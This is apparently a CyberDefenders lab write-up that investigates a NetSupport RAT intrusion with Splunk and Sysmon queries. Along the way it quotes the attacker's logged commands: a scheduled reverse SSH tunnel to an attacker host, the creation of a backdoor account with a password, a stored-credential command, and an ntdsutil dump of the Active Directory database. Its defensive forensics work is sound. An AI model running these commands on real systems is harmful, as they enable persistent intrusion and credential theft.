---
title: "CyberDefenders: NetSupport RAT - TA569 Lab"
date: 2026-02-18 10:00:00 +0000
categories: [Digital Forensics, Threat Hunting]
tags: [dfir, windows, forensics, threat hunting]

---

## Scenario

A leading tech firm, TechSynergy, has detected an anomaly after an employee engaged with an unexpected email attachment. This triggered a series of covert operations within the network, including unusual account activity and system alterations. Security alerts indicate potential access to sensitive infrastructure, with suspicious outbound traffic raising red flags. The incident response team fears a sophisticated attack may be underway, threatening critical data. As a threat hunting and digital forensics specialist, your mission is to dissect the intrusion, map the attacker’s trail, and determine the scope of the potential damage to protect the organization.


## Initial Access 


**Q1 : While reviewing the logs, you notice the employee downloaded a malicious attachment that started the attack. What is the name of the file used to deliver this initial malicious payload to the victim’s system?**



A malicious attachment was downloaded , that started the attack and gained the attacker initial access 




> SPL Command : 


``` index="main" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=15 | table TargetFilename Contents host User _time | sort _time ```


> Query Explanation : 

**source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"** : filter for only "Sysmon" Events 


**EventCode=15** : Event Id 15 means  “File Created” or “File Stream Created” 


**table TargetFilename  Contents  host  User _time** : making a columns for the selected fields 


**sort _time** : Sort the results ascendingly 




![](assets/posts/CyberDefendersNetSUP/2.png)



The log revealed the creation of **Zone.Identifier** associated with a zip file **Invoices.zip** 


> ANSWER : invoices.zip



**Q2 : Digging into the employee’s workstation, you find that the attack began when a specific file from the malicious attachment was executed. What is the name of the file that triggered the attack?**


From the previous log we found the execution of a **.js** file extracted from the zip file that triggered the attack 

> ANSWER : Invoice_2326.js




## Execution 

**Q3 : Your forensic analysis reveals that the initial file downloaded a PowerShell script to advance the attack. What is the name of this PowerShell script that was downloaded and executed?**

Viewing the contents of the **.js** file that triggered the attack we found that it downloads a PowerShell script and executes it . 

![](assets/posts/CyberDefendersNetSUP/3.png)

> ANSWER : update.ps1



**Q4 : While examining the PowerShell script’s actions, you discover it fetched and ran an executable file to deepen the attacker’s foothold. What is the name of this executable file?** 


From the previous info we knew that the the zip file and the .js file execution has occured in "**2025-07-17 19:38**" from **IT-WS01** host and **CORP\danderson** user , now we need to adjust the time to this timestamp as the beginning and see all the commands and files created after this time . 

> SPL Command :

```index="main" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 host="IT-WS01" User="CORP\\danderson" | table _time CommandLine ParentCommandLine | sort _time```


> Query Explanation : 

**source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"** : Filter for only Sysmon 

**EventCode=1** : Process creation 

**host="IT-WS01"** : Filter for the suspected host 

**User="CORP\\danderson"** : Filter for suspected user


![](assets/posts/CyberDefendersNetSUP/4.png)


We found that this binary has fetched and executed some commands like " **net user /domain** " which used for discovery (see list for all the users registered in the domain) 

> ANSWER : netsupport.exe


## Command and Control 


**Q5 : Analyzing network traffic, you spot suspicious outbound connections from the compromised system to a command-and-control (C2) server. What is the IP address used for the initial C2 communication by the attacker’s beacon?** 

Now , we need to see the network connections done by this binary . 

> SPL Command : 

```index="main" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 process_name="netsupport.exe" | table DestinationIp```

> Query Explanation : 

**EventCode=3** : Network connections

**process_name="netsupport.exe"** : filter for only the process of the binary 

**table DestinationIp** : make the DestinationIp as a column 


![](assets/posts/CyberDefendersNetSUP/5.png)

> ANSWER : 10.10.5.100

## Persistence 

**Q6 : To ensure persistence, the attacker modified the system to run their malicious code on every boot. Which registry key did they add to achieve this?** 

Now , we need to get the persistence done by the binary to avoid reboots , the most common ways for persistence are **Editing Registry Keys** and making **Scheduled Tasks** , from the question we need to search for added registry key . 

> SPL Command : 
```index=main EventCode=13 "*netsupport.exe"``` 

> Query Explanation :

**EventCode=13** : This Registry event type identifies Registry value modifications 

**"*netsupport.exe"** : Filter for any existence for the malicious binary 

![](assets/posts/CyberDefendersNetSUP/6.png)


We found only one existence for the malicious binary that he added a **RUN** key to run every system reboot . 

> ANSWER : NetSupport 


**Q7 : You notice a rogue SSH server running on the compromised system, likely for remote access. Which uncommon TCP port is this rogue SSH server using?**

Now , we neet to find any instances where the **ssh.exe** executable was launched on the system

> SPL Command : 

```index=main EventCode=1 *ssh.exe* | table CommandLine ParentCommandLine``` 

![](assets/posts/CyberDefendersNetSUP/7.png)

We found 1 existence for **ssh.exe** which reveals the command used by the attacker .


```schtasks.exe  /create /sc minute /mo 1 /tn "SSH Key Exchange" /rl highest /tr "C:\ProgramData\sshd\ssh.exe -i C:\ProgramData\sshd\config\keys\id_rsa -N -R 369:127.0.0.1:2222 root@10.10.5.142 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"```

> Command Analysis : 

**schtasks.exe  /create /sc minute /mo 1 /tn "SSH Key Exchange"** : creates a scheduled task that runs every 1 minutes that is used for persistence

**-R 369:127.0.0.1:2222 root@10.10.5.142** : sets up a persistent reverse SSH tunnel from the victim machine to the attacker's server, whose IP address is **10.10.5.142**. In this setup, port 369 on the attacker's machine is forwarded to port **2222** on the victim's machine (This tunnel allows the attacker to connect to the rogue SSH server on the victim machine by connecting to their own C2 IP (**10.10.5.142**) on port 369)

> ANSWER : 2222


**Q8 : During your investigation, you find a new user account created on the compromised system, likely to blend in with normal operations. What is the password for this account, which the attacker used to maintain persistence?** 


Now , we need to search in  the **Security** Logs for evidence of a new local user account creation 

> SPL Command : 

```index="main" EventCode="4720" SubjectUserName="danderson" | table SamAccountName```

![](assets/posts/CyberDefendersNetSUP/8.png)


--> **EventCode="4720"** : reveals the local account creation 


After Investigating , we found that there is only one account created **"WDAGUtilityAccount2"** 


Now , After reviewing the commands done by the malicious binary 

![](assets/posts/CyberDefendersNetSUP/9.png)

We found this command ```net user WDAGUtilityAccount2 Decryptme1488@ /add``` which he added the account with the password **Decryptme1488@** 


> ANSWER : Decryptme1488@

## Discovery 

**Q9 : While reviewing the Windows Credential Manager on the compromised workstation, you discover the attacker tried to update credentials for an account identified during their reconnaissance. What is the name of this account?**


Before the creation of this account , we find that the attacker was querying the active directory to find details about **ServiceAdmin** account throught this command ```net user ServiceAdmin /domain``` and then he used this command ```cmdkey /add:DC01 /user:CORPServiceAdmin /pass:FakePass123!``` which creates or updates a stored credential in the Windows Credential Manager for the target DC01, using the username **CORP\ServiceAdmin** and the password **FakePass123!**

![](assets/posts/CyberDefendersNetSUP/10.png)


> ANSWER : ServiceAdmin


## Defense Evasion 

**Q10 : Checking the antivirus logs, you notice the attacker tampered with the software to avoid detection. Which directory did they add as an exclusion in the antivirus settings?**

To accurately track any modifications made to the configuration of **Windows Defender** such as the creation or modification of exclusion rules , we need to monitor **Windows Defender Operational log**

> SPL Command : 

```index=main source="xmlwineventlog:microsoft-windows-windows defender/operational" EventCode=5007 New_Value=*Exclusions | table _time, Old_Value, New_Value```

> Query Explanation : 

**EventCode=5007** : "A configuration change was made to Windows Defender."

**New_Value=*Exclusions** : To search for any exclusions path 

![](assets/posts/CyberDefendersNetSUP/11.png)

This reveals that the attacker excluded the directory **C:\Users\Public** from its real-time protection and scanning routines 

> ANSWER : C:\Users\Public

**Q11 : Your analysis of the system’s security settings shows that the attacker disabled a specific Windows Defender feature to evade detection. What is the name of this disabled feature?**

We need to check PowerShell execution history, as this is the primary method for attackers to tamper with Windows Defender settings , after checking the commands done by the malicious program i found the disabled feature 

![](assets/posts/CyberDefendersNetSUP/12.png)

> ANSWER : DisableBehaviorMonitoring

## Lateral Movement 

**Q12 : Examining network logs, you identify evidence of lateral movement to the Domain Controller. Which user account did the attacker use to perform this movement?** 

**Q13 : The attacker used the Impacket toolkit to execute malicious actions. Before running these tools, they modified the host-based firewall to allow connections to the ‘winmgmt’ process on any local port. What is the name of the firewall rule they created?**

Following the attacker's spawned processes tracked by **Sysmon Event ID 1** , i found this suspicious command

![](assets/posts/CyberDefendersNetSUP/13.png)

> Command Analysis : 

 The attacker leveraged the wmic (Windows Management Instrumentation Command-line) tool to initiate a remote command execution targeting the Domain Controller with the IP address **10.10.11.216** and he used the credentials of **aclark** to authenticate and execute a remote command on the Domain Controller , then he added an Inbound rule and named it "**WMI**" using **netsh.exe** (Windows utility used to configure and manipulate network and firewall settings)

--> Attackers exploit **WMI** for remote code execution or lateral movement across a network


 > ANSWER : aclark

 > ANSWER : WMI 

## Credential Access 

**Q14 : While reviewing event logs, you pinpoint the moment the attacker successfully extracted password hashes from the compromised machine. At what time did this hash dump occur?** 

To identify the time when the attacker dumped password hashes from the compromised system, I concentrated on detecting unauthorized or suspicious access to the **LSASS** (Local Security Authority Subsystem Service) process 

--> Attackers frequently target **LSASS** during post-exploitation to extract these credentials

> SPL Command : 

```index=main host="IT-WS01" EventCode=10 TargetImage="*lsass.exe*" | table SourceImage TargetImage _time | sort +_time``` 

> Query Explanation : 

**EventCode=10** : logs when a process gains access to the memory of another process (**ProcessAccess**)

**TargetImage="*lsass.exe*"** : Filter for **lsass.exe** as the target image (process to be accessed)

**table SourceImage** : Making a column for the the accessing processes 

![](assets/posts/CyberDefendersNetSUP/14.png)

After investigating , we found that the malicious program have access **lsass.exe** at **2025-07-17 21:36:24** 

> ANSWER : 2025-07-17 21:36


## Collection 

**Q15 : Your investigation reveals that the attacker dumped the Domain Controller’s database to steal sensitive data. In which directory did they save this database?** 

**ntds.dit** – The main Active Directory database file that contains all user credentials, including password hashes and other directory objects 

**ntdsutil.exe** - a legitimate command-line tool provided by Microsoft, commonly used by system administrators to manage and maintain Active Directory databases

Now we need to search for any signs of **ntds**

> SPL Command : 

```index=main EventCode=1 "ntds" | table CommandLine ParentCommandLine```

![](assets/posts/CyberDefendersNetSUP/15.png)

We found this command **C:\Windows\system32\ntdsutil.exe" "ac i ntds" ifm "create full c:\ProgramData\ntdsutil" q q**  --> the attacker abused ntdsutil.exe, a legitimate built-in administrative tool,generating a full dump of the Active Directory database at the following location: C:\ProgramData\ntdsutil . 

> ANSWER : C:\ProgramData\ntdsutil


## Exfiltration 

**Q16 : As you analyze the compromised system, you find a file where the attacker stored data for later exfiltration. What is the name of this file?** 

Now we should investigate for any commands used by the attacker to compress, archive, or package the dumped data , while reviewing the commands around this time we found this command 

![](assets/posts/CyberDefendersNetSUP/16.png)


This PowerShell command uses the Compress-Archive cmdlet to compress the extracted NTDS (Active Directory database) dump file. It packages the sensitive data into a ZIP archive named **Data_backup_20250716.zip**

> ANSWER : Data_backup_20250716.zip



























